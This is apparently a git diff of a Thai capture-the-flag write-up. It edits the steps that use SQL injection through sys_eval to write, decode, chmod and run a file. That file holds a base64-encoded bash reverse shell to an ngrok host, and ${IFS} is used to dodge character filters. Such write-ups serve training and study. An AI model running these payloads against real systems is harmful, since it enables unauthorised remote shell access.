@@ -162,7 +162,7 @@ dirsearch -u http://35.240.216.137/
    - ตัวอย่าง: `ls${IFS}/` แทน `ls /`
 
 #### 6. Reverse Shell Setup
-วางแผนการทำ reverse shell: แต่จะใส่ payload ทั้งหมดไม่ได้แน่ๆ เพราะโดนจำกัดความยาวของ payload 
+จึงคิดวางแผนจะทำ reverse shell: แต่จะใส่ payload ทั้งหมดไม่ได้แน่ๆ เพราะโดนจำกัดความยาวของ payload 
 
 1. **Setup Listener:**
    ```bash
@@ -193,7 +193,7 @@ dirsearch -u http://35.240.216.137/
     1 AND ''=(select sys_eval('echo${IFS}"/13760 0>&1"'>>a))#
     ```
 
-- นำ payload ทั้งหมดไปทดสอบ แต่ปรากฎว่า payload บางอันใช้ไม่ได้ ทั้งที่ limit ความยาวแล้ว อาจจะมี filter อักขระอะไรอีกรึป่าว
+- นำ payload ทั้งหมดไปทดสอบ แต่ปรากฎว่า payload บางอันใช้ไม่ได้ หรืออาจจะมี filter อักขระอะไรอีกรึป่าว
 - จึงทำการเปลี่ยน command ใหม่ โดย encode command ในส่วนของ reverse shell เป็น base64 ก่อนเพื่อหลีกเลี่ยง special characters
     ```bash
     echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzEzNzYwIDA+JjE=|bass64${IFS}-d|bash${IFS}-i
@@ -203,38 +203,46 @@ dirsearch -u http://35.240.216.137/
     ```bash
     #ใช้ echo เขียนไฟล์ โดยใช้ชื่อไฟล์ a
 
-    1 AND ''=(select sys_eval('echo${IFS}"L2Jpbi9iYXNoIC1"'>a))#
-    1 AND ''=(select sys_eval('echo${IFS}"pID4mIC9kZX"'>>a))#
-    1 AND ''=(select sys_eval('echo${IFS}"XYvdGNwLzAudGNwL"'>>a))#
+    1 AND ''=(select sys_eval('echo${IFS}"L2Jpbi9iYXNoIC1">a'))#
+    1 AND ''=(select sys_eval('echo${IFS}"pID4mIC9kZX">>a'))#
+    1 AND ''=(select sys_eval('echo${IFS}"XYvdGNwLzAudGNwL">>a'))#
     ......
-    1 AND ''=(select sys_eval('echo${IFS}"|base64${IFS}-d"'>>a))#
-    1 AND ''=(select sys_eval('echo${IFS}"|bash${IFS}-i"'>>a))#
+    1 AND ''=(select sys_eval('echo${IFS}"|base64${IFS}-d">>a'))#
+    1 AND ''=(select sys_eval('echo${IFS}"|bash${IFS}-i">>a'))#
     ```
 
-- เมื่อส่ง payload ทั้งหมดได้สำเร็จ ก็ลองไปอ่านไฟล์ `a` ที่เขียนไว้ ดูก่อน ปรากฎว่า มีไฟล์ถูกเขียนจริง แต่ข้อความติดกันหมดเลย
+- เมื่อส่ง payload ทั้งหมดได้สำเร็จ ก็ลองไปอ่านไฟล์ `a` ที่เขียนไว้ ดูก่อน ปรากฎว่า มีไฟล์ถูกเขียนจริง แต่...
 
     ```bash
-    #ข้อความในไฟล์ติดกันหมด ไม่สามารถใช้ได้
-    `echoL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzEzNzYwIDA+JjE=|bass64-d|bash-i`
+    #ข้อความในไฟล์ติดกัน และถูกขึ้นบรรทัดใหม่ ไม่สามารถใช้ได้
+
+    echoL2Jpbi9iYXNoIC1
+    pID4mIC9kZX
+    YvdGNwLzAudGNwL
+    mFwLm5ncm9rLmlv
+    LzEzNzYwIDA+JjE=
+    |bass64-d
+    |bash-i
     ```
 
 - เอาใหม่อีกครั้ง encode ทั้งหมดนี้แหละ เป็น base64 ไปเลย ที่นี้เขียน code python ให้ช่วยแบ่ง payload ให้เลย
+  และเปลี่ยนคำสั่ง `echo` เป็น `printf` แทน
 
     <img src="./resources/57.png" alt="" style="width:90% !important;">
 
 
-- เมื่อส่ง payload ทั้งหมดแล้วก็ไปสั่ง decode ไฟล์ `a` ที่เป็น base64 กลับเป็นข้อความเดิม ด้วยคำสั่ง base64 -d แล้ว save เป็นไฟล์ใหม่ชื่อไฟล์ `b`
+- เมื่อส่ง payload ทั้งหมดแล้วก็ไปสั่ง decode ไฟล์ `a` ที่เป็น base64 กลับเป็นข้อความเดิม ด้วยคำสั่ง `base64 -d` แล้ว save เป็นไฟล์ใหม่ชื่อไฟล์ `b`
     ```bash
     1' AND ''=(select sys_eval('cat${IFS}a|base64${IFS}-d${IFS}>b'))#
     ```
 
 - เปลี่ยนสิทธิ์ของไฟล์ `b` ให้ execute ได้
     ```bash
-    1' AND ''=(select sys_eval('chmod${IFS}+x${IFS}b'))#`
+    1' AND ''=(select sys_eval('chmod${IFS}+x${IFS}b'))#
     ```
-- และสุดท้ายสั่ง execute ไฟล์ b เลย
+- และสุดท้ายสั่ง `execute` ไฟล์ `b` เลย
     ```bash
-    1' AND ''=(select sys_eval('./b'))#`
+    1' AND ''=(select sys_eval('./b'))#
     ```
 สำเร็จ reverse shell ได้แล้ว ที่เหลือก็หาไฟล์ flag 
 
